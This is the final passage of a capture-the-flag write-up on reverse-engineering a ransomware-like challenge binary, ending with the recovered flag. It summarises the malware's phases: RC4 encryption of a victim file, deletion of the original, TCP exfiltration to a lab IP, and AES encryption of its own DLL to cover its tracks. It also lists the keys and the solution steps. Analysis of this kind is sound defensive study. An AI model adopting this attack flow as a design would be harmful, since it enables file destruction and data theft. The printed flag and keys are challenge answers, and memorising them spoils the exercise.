Removed 4-byte header, file size: 2588
Decrypted user.html saved!
```

**What happened:**
1. Loaded our 32-byte RC4 key
2. Read user.html.enc (2592 bytes with header)
3. Removed the 4-byte network protocol header (2588 bytes remaining)
4. Ran RC4 decryption on the 2588 bytes
### Opening the File

Opening `user.html` in a web browser reveals the complete decrypted file with the flag.
<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/288vWsws/Screenshot-20251004-010151.png" alt="Last minute build" width="400">
</div>


**FLAG:** `F4N_N3R0{W3lc0m3_t0_my_pr0f1l3_7h1s_1s_my_w@ll3t_k3y}`

---

# Summary
Alright so we have came this far. This is what I took from all this. 
## Complete Attack Flow 

### Phase 1: Initial Setup 
- "anonymous" file appears on the system (269 bytes)
- PCAP shows it was downloaded via wget from 192.168.56.1:8000
- libgen.dll must already be present at the hardcoded path
### Phase 2: Key Generation 
- Malware executes and loads libgen.dll
- Calls `gen_from_file("anonymous")`
- Bytecode interpreter in DLL processes 269 bytes of instructions
- Returns 32-byte RC4 key: `r4ns0mw@rE_c4n_d357r0y_f1l3s_n0w`

### Phase 3: Victim File Encryption 
- Opens `C:\ProgramData\Important\user.html`
- Encrypts contents using RC4 with generated key
- Writes encrypted output to `user.html.enc`
- Deletes original `user.html` using `DeleteFileA()`

### Phase 4: First Exfiltration 
- Connects to 192.168.134.132:8888 via TCP socket
- Sends 4-byte length header
- Sends encrypted user.html.enc contents
- Closes connection

### Phase 5: Tool Cleanup 
- Reads libgen.dll from disk
- Computes SHA256("hackingisnotacrime") to derive AES key
- Encrypts libgen.dll using AES-256-ECB
- Writes encrypted output to file named "hacker"
- Deletes original libgen.dll using `DeleteFileA()`

### Phase 6: Second Exfiltration 
- Connects to 192.168.134.132:8888 via TCP socket
- Sends 4-byte length header 
- Sends encrypted "hacker" file contents
- Closes connection

### Phase 7: Termination
- Cleanup and exit
- Victim left with only encrypted files and no decryption tools


## Complete Solution Path

1. **Initial recon** with PE Studio revealed OpenSSL usage and network communication
2. **PCAP analysis** found the "anonymous" file download and two encrypted file uploads
3. **Static analysis in IDA** identified RC4 encryption for user files and AES-256-ECB for the DLL
4. **Extracted encrypted files** from TCP streams in the PCAP
5. **Hit an AES block alignment error** because we needed to remove the 4-byte network header
6. **Decrypted libgen.dll** using AES-256-ECB with SHA256("hackingisnotacrime") as key
7. **Executed the DLL** with ctypes to generate the RC4 key from "anonymous"
8. **Decrypted user.html** using RC4 with the extracted key
9. **Retrieved the flag** from the decrypted HTML file